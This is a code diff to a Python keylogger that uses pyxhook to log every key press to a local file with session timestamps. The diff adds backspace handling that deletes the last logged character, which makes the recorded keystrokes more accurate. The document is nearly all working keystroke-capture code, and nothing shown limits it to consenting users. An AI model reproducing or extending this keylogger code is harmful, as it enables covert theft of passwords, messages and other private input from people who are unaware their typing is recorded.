@@ -6,12 +6,13 @@ grave key is found below Esc key
 
 import pyxhook
 import metadata
+import os
 from datetime import datetime
 
 #change this to your log file's path
 isPrevNl = False
 log_file='file.log'
-fob=open(log_file,'a')
+fob=open(log_file,'a+')
 time = datetime.now()
 fob.write("\n-----------------------------New Session "+ str(time) +" --------------------------\n")
 fob.close()
@@ -19,7 +20,7 @@ fob.close()
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
 	global isPrevNl
-	fob=open(log_file,'a')
+	fob=open(log_file,'a+')
 
 	if event.Ascii==96: #96 is the ascii value of the grave key (`)
 		fob.close()
@@ -27,6 +28,10 @@ def OnKeyPress(event):
 
 	elif event.Key=='Shift_R' or event.Key=='Shift_L':
 		pass
+
+	elif event.Key=="BackSpace":
+		fob.seek(-1, os.SEEK_END)
+		fob.truncate()
 
 	elif event.Key=='Return':
 		fob.write('\n')
